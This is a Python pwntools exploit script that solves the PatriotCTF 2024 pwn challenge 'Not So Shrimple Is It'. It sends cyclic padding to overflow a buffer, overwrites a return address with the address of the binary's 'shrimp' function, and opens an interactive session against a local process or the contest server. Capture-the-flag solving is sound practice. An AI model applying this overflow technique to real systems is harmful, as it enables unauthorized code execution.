#!/usr/bin/env python3
from pwn import *
import os
import sys

context.update(
    arch='amd64',
    endian='little',
    os='linux',
    log_level='debug',
    terminal=['tmux', 'split-window', '-h', '-p 65'],
)

REMOTE = False
TARGET = os.path.realpath('/ctf-writeups/PatriotCTF 2024/pwn/Not So Shrimple Is It/shrimple')
elf = ELF(TARGET)

def attach(r):
    if REMOTE:
        return

    bkps = []
    cmds = []

    gdb.attach(r, '\n'.join(['break {}'.format(x) for x in bkps] + cmds))

def exploit(r):
    attach(r)

    r.sendlineafter(b'>> ', cyclic(0x2b) + b'\0')
    r.sendlineafter(b'>> ', cyclic(0x2a) + b'\0')
    r.sendlineafter(b'>> ', cyclic(0x26) + p64(elf.sym.shrimp + 5))
    r.interactive()
    return

if __name__ == '__main__':
    if len(sys.argv) == 2 and sys.argv[1] == 'remote':
        REMOTE = True
        r = remote('chal.competitivecyber.club', 8884)
    else:
        REMOTE = False
        r = process([TARGET,])

    exploit(r)
    exit(0)
